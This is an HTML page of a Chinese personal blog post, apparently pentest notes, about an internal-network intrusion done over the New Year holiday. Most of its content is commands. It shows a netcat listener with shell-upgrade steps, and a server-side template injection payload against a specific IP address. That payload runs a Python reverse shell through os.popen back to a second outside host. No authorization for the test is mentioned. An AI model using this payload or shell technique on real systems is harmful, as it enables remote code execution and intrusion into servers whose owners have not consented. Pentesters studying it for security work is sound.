@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="过年的一次内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试-欧拉">
+<meta property="og:url" content="https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html">
+<meta property="og:site_name" content="学习记录">
+<meta property="og:description" content="过年的一次内网渗透">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://example.com/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230120181158143.png">
+<meta property="og:image" content="https://example.com/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230120181322429.png">
+<meta property="article:published_time" content="2023-01-20T10:01:36.000Z">
+<meta property="article:modified_time" content="2023-01-21T00:59:12.535Z">
+<meta property="article:author" content="MirRoR4s">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://example.com/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230120181158143.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>渗透测试-欧拉</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">项目</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">MyGithub</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/01/21/KnightCTF-2023/index.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&text=渗透测试-欧拉"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&title=渗透测试-欧拉"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&is_video=false&description=渗透测试-欧拉"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透测试-欧拉&body=Check out this article: https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&title=渗透测试-欧拉"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&title=渗透测试-欧拉"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&title=渗透测试-欧拉"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&title=渗透测试-欧拉"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&name=渗透测试-欧拉&description=&lt;!--toc--&gt;
+
+&lt;p&gt;过年的一次内网渗透&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&t=渗透测试-欧拉"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#an-zhuang-nps"><span class="toc-number">1.</span> <span class="toc-text">安装 nps</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ru-he-huo-qu-dao-yi-ge-zhen-zheng-de-shell-zhong-duan"><span class="toc-number"></span> <span class="toc-text">如何获取到一个真正的shell终端</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#python-fan-dan-shell"><span class="toc-number">1.</span> <span class="toc-text">python 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dang-qian-ip"><span class="toc-number">1.1.</span> <span class="toc-text">当前ip</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nei-he-xin-xi"><span class="toc-number">1.2.</span> <span class="toc-text">内核信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-kao-lian-jie"><span class="toc-number"></span> <span class="toc-text">参考链接</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        渗透测试-欧拉
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">MirRoR4s</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-01-20T10:01:36.000Z" itemprop="datePublished">2023-01-20</time>
+        
+        (Updated: <time datetime="2023-01-21T00:59:12.535Z" itemprop="dateModified">2023-01-21</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <!--toc-->
+
+<p>过年的一次内网渗透</p>
+<span id="more"></span>
+
+
+
+<h4 id="an-zhuang-nps"><a href="#安装-nps" class="headerlink" title="安装 nps"></a>安装 nps<a href="#an-zhuang-nps" class="header-anchor">#</a></h4><p>把vps服务器的流量转到我们的本地kali上来。</p>
+<p><a target="_blank" rel="noopener" href="https://www.moewah.com/archives/842.html">https://www.moewah.com/archives/842.html</a></p>
+<h3 id="ru-he-huo-qu-dao-yi-ge-zhen-zheng-de-shell-zhong-duan"><a href="#如何获取到一个真正的shell终端" class="headerlink" title="如何获取到一个真正的shell终端"></a>如何获取到一个真正的shell终端<a href="#ru-he-huo-qu-dao-yi-ge-zhen-zheng-de-shell-zhong-duan" class="header-anchor">#</a></h3><p><a target="_blank" rel="noopener" href="http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html">http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40572277/article/details/104990616?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=1">Linux中使用ctrl+z停止任务后如何恢复任务</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">nc -lvp 9001</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">ctrl Z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br><span class="line"><span class="built_in">fg</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="built_in">stty</span> rows xx columns xxx</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="python-fan-dan-shell"><a href="#python-反弹shell" class="headerlink" title="python 反弹shell"></a>python 反弹shell<a href="#python-fan-dan-shell" class="header-anchor">#</a></h4><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">http://121.37.186.22/?name=</span><span class="template-variable">&#123;&#123;url_for.__globals__.os.__dict__.popen(<span class="string">&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;</span><span class="number">47</span>.<span class="number">115</span>.<span class="number">222</span>.<span class="number">18</span>\<span class="string">&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;</span>/bin/sh\<span class="string">&quot;,\&quot;</span>-i\<span class="string">&quot;]);&#x27;&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="dang-qian-ip"><a href="#当前ip" class="headerlink" title="当前ip"></a>当前ip<a href="#dang-qian-ip" class="header-anchor">#</a></h5><p><img src="/../images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230120181158143.png" alt="image-20230120181158143"></p>
+<h5 id="nei-he-xin-xi"><a href="#内核信息" class="headerlink" title="内核信息"></a>内核信息<a href="#nei-he-xin-xi" class="header-anchor">#</a></h5><p>发现是红帽</p>
+<p><img src="/../images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230120181322429.png" alt="image-20230120181322429"></p>
+<h3 id="can-kao-lian-jie"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接<a href="#can-kao-lian-jie" class="header-anchor">#</a></h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/332083.html">Linux内网渗透——Linux信息收集与横向移动 - FreeBuf网络安全行业门户</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">项目</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">MyGithub</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#an-zhuang-nps"><span class="toc-number">1.</span> <span class="toc-text">安装 nps</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ru-he-huo-qu-dao-yi-ge-zhen-zheng-de-shell-zhong-duan"><span class="toc-number"></span> <span class="toc-text">如何获取到一个真正的shell终端</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#python-fan-dan-shell"><span class="toc-number">1.</span> <span class="toc-text">python 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dang-qian-ip"><span class="toc-number">1.1.</span> <span class="toc-text">当前ip</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nei-he-xin-xi"><span class="toc-number">1.2.</span> <span class="toc-text">内核信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-kao-lian-jie"><span class="toc-number"></span> <span class="toc-text">参考链接</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&text=渗透测试-欧拉"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&title=渗透测试-欧拉"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&is_video=false&description=渗透测试-欧拉"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透测试-欧拉&body=Check out this article: https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&title=渗透测试-欧拉"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&title=渗透测试-欧拉"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&title=渗透测试-欧拉"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&title=渗透测试-欧拉"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&name=渗透测试-欧拉&description=&lt;!--toc--&gt;
+
+&lt;p&gt;过年的一次内网渗透&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://example.com/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html&t=渗透测试-欧拉"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    1999-2022
+    MirRoR4s
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">项目</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">MyGithub</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
